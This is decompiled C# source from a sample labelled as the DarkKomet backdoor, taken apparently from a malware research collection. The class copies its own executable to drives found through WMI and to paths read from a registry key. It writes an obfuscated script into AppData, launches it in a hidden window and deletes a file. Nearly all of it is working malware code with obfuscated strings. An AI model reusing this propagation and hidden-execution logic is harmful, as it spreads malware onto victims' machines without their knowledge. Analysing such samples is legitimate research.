// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

internal sealed class \u0002\u2001
{
  private static \u0003\u2001 \u0002 = new \u0003\u2001();
  private string \u0003 = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);

  public static void \u0002() => new \u0002\u2001().\u0002();

  public void \u0002()
  {
    try
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher(\u0006\u2002.\u0002(-885877487)).Get())
      {
        Thread.Sleep(50);
        string str = Convert.ToString(managementObject[\u0006\u2002.\u0002(-885877391)]);
        if (!str.Contains(\u0006\u2002.\u0002(-885876124)))
          File.Copy(this.\u0003, \u0006\u2002.\u0002(-885877398) + Environment.MachineName + \u0006\u2002.\u0002(-885875661) + str + \u0006\u2002.\u0002(-885877411), true);
      }
    }
    catch (Exception ex)
    {
      \u0002\u2001.\u0002.\u0002(ex.ToString());
    }
    try
    {
      string name = \u0006\u2002.\u0002(-885877433);
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
      foreach (string valueName in registryKey.GetValueNames())
      {
        Thread.Sleep(50);
        string str = registryKey.GetValue(valueName).ToString();
        if (valueName.ToLower() != \u0006\u2002.\u0002(-885877257))
        {
          try
          {
            File.Copy(this.\u0003, str + \u0006\u2002.\u0002(-885877275), true);
          }
          catch (Exception ex)
          {
          }
        }
      }
      registryKey.Close();
    }
    catch (Exception ex)
    {
      \u0002\u2001.\u0002.\u0002(ex.ToString());
    }
  }

  public static void \u0003()
  {
    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006\u2002.\u0002(-885877298)))
      return;
    StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006\u2002.\u0002(-885877298));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877700));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877728));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877752));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877660));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877581));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877515));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885876935));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885876991));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885876919));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885876851));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885876779));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877222));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885877157));
    streamWriter.WriteLine(\u0006\u2002.\u0002(-885876094));
    streamWriter.Close();
    new Process()
    {
      StartInfo = {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006\u2002.\u0002(-885877298))
      }
    }.Start();
    try
    {
      File.Delete(Path.Combine(Directory.GetCurrentDirectory(), \u0006\u2002.\u0002(-885877096)));
    }
    catch
    {
    }
  }
}
